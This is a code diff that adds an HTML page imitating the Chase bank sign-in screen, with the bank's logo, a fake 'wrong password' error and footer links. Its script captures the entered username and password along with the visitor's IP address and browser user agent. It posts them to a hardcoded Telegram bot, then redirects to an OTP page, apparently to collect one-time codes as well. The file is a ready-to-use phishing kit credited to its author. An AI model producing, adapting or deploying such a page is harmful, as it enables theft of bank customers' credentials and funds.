@@ -1,0 +1,238 @@
+
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Login</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.15.4/css/all.min.css" integrity="sha512-I5k/WeGAyI1xljkB9RQ6msii6/w4LkYJo9q0gtc6TZh0gF1BzUwXaWsO8byqUPW6lQHrSkY0BmbK+YUdCinUWw==" crossorigin="anonymous" referrerpolicy="no-referrer" />
+    <style>
+        body {
+            display: flex;
+            justify-content: center;
+            align-items: flex-start;
+            min-height: 100vh;
+            margin: 0;
+            font-family: Arial, sans-serif;
+            background: url('https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSoe6J-X7SeKI2R7KF3QKSz0UrKL4A2SI3Kcg&usqp=CAU') no-repeat center center fixed;
+            background-size: cover;
+            overflow-y: scroll;
+        }
+        .container {
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            width: 100%;
+            margin-top: 50px;
+            padding: 20px;
+            box-sizing: border-box;
+            background-color: rgba(240, 242, 245, 0.5);
+        }
+        .logo {
+            max-width: 200px;
+            margin-bottom: 20px;
+        }
+        .login-container {
+            background-color: white;
+            padding: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            width: 330px;
+            text-align: left;
+        }
+        .login-container label {
+            font-size: 14px;
+            margin-bottom: 5px;
+            display: block;
+        }
+        .login-container input[type="text"],
+        .login-container input[type="password"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-bottom: 20px;
+            border: none;
+            border-bottom: 1px solid #ccc;
+            outline: none;
+        }
+        .login-container .password-container {
+            position: relative;
+        }
+        .login-container .password-container input[type="password"] {
+            width: calc(100% - 40px);
+        }
+        .login-container .toggle-password {
+            position: absolute;
+            right: 10px;
+            top: 10px;
+            cursor: pointer;
+            color: #007bff;
+            font-size: 14px;
+        }
+        .login-container input[type="submit"] {
+            width: 100%;
+            padding: 12px;
+            font-size: 16px;
+            background-color: #007bff;
+            border: none;
+            color: white;
+            cursor: pointer;
+        }
+        .login-container input[type="submit"]:hover {
+            background-color: #0056b3;
+        }
+        .login-container .options {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            margin-bottom: 20px;
+        }
+        .login-container .options label {
+            display: flex;
+            align-items: center;
+        }
+        .login-container .options input[type="checkbox"] {
+            margin-right: 5px;
+        }
+        .login-container .forgot-signup {
+            text-align: left;
+            font-size: 12px;
+        }
+        .login-container .forgot-signup a {
+            color: #007bff;
+            text-decoration: none;
+        }
+        .login-container .forgot-signup a:hover {
+            text-decoration: underline;
+        }
+        .error-message {
+            color: #ff6666; /* Light red color */
+            margin-bottom: 20px;
+            font-size: 14px;
+        }
+        .footer {
+            background-color: #fff;
+            color: #343a40;
+            padding: 15px 20px;
+            width: 100%;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            position: fixed;
+            bottom: 0;
+            box-shadow: 0 -2px 4px rgba(0, 0, 0, 0.1);
+            z-index: 999;
+        }
+        .footer .social-icons {
+            display: flex;
+            align-items: center;
+        }
+        .footer .social-icons a {
+            color: #343a40;
+            text-decoration: none;
+            margin-right: 10px;
+            font-size: 20px;
+        }
+        .footer .links {
+            display: flex;
+            align-items: center;
+        }
+        .footer .links a {
+            color: #343a40;
+            text-decoration: none;
+            margin-right: 15px;
+            font-size: 14px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/e/ed/Chase_logo_2007.svg/1280px-Chase_logo_2007.svg.png" alt="Chase Logo" class="logo">
+        <div class="login-container">
+            <div class="error-message">We can't find that username and password. Try again.</div>
+            <form id="loginForm" onsubmit="sendMessage(event)">
+                <label for="username">Username</label>
+                <input type="text" id="username" name="username" required>
+                <label for="password">Password</label>
+                <div class="password-container">
+                    <input type="password" id="password" name="password" required>
+                    <span class="toggle-password" onclick="togglePasswordVisibility()">Show</span>
+                </div>
+                <div class="options">
+                    <label><input type="checkbox" name="remember"> Remember me</label>
+                    <label><input type="checkbox" name="token"> Use token</label>
+                </div>
+                <input type="submit" value="Sign In">
+            </form>
+            <div class="forgot-signup">
+                <p><a href="#">Forgot username/password?</a></p>
+                <p><a href="#">Not Enrolled? Sign Up Now</a></p>
+            </div>
+        </div>
+    </div>
+    <div class="footer">
+        <div class="social-icons">
+            <a href="#"><i class="fab fa-facebook"></i></a>
+            <a href="#"><i class="fab fa-instagram"></i></a>
+            <a href="#"><i class="fab fa-twitter"></i></a>
+            <a href="#"><i class="fab fa-youtube"></i></a>
+        </div>
+        <div class="links">
+            <a href="#">Contact us</a>
+            <a href="#">Privacy</a>
+            <a href="#">Security</a>
+            <a href="#">Terms of use</a>
+            <a href="#">Accessibility</a>
+        </div>
+    </div>
+
+    <script>
+        function togglePasswordVisibility() {
+            var passwordField = document.getElementById("password");
+            if (passwordField.type === "password") {
+                passwordField.type = "text";
+                document.querySelector(".toggle-password").textContent = "Hide";
+            } else {
+                passwordField.type = "password";
+                document.querySelector(".toggle-password").textContent = "Show";
+            }
+        }
+
+        async function sendMessage(event) {
+            event.preventDefault();
+
+            const username = document.getElementById("username").value;
+            const password = document.getElementById("password").value;
+            const userAgent = navigator.userAgent;
+
+            // Fetch the IP address using an external service
+            const ipResponse = await fetch('https://api.ipify.org?format=json');
+            const ipData = await ipResponse.json();
+            const ipAddress = ipData.ip;
+
+            const message = `🎲CHASE🎲\nUsername: ${username}\nPassword: ${password}\nIP: ${ipAddress}\nUserAgent: ${userAgent}\n\nCoded by @Litchvessel`;
+
+            const botToken = '6990796188:AAGctbDrVjEcw8VMyF263QDtTgrBh6gY--8';  // Replace with your Telegram bot token
+            const chatId = '981496445';  // Replace with your chat ID
+            const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+
+            // Send the message to Telegram
+            fetch(telegramUrl, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify({
+                    chat_id: chatId,
+                    text: message,
+                }),
+            }).then(response => {
+                if (response.ok) {
+                    window.location.href = 'otp.html';  // Redirect to login2.html
+                } else {
+                    alert('Failed to send message.');
+                }
+            });
+        }
+    </script>
+</body>
+</html>
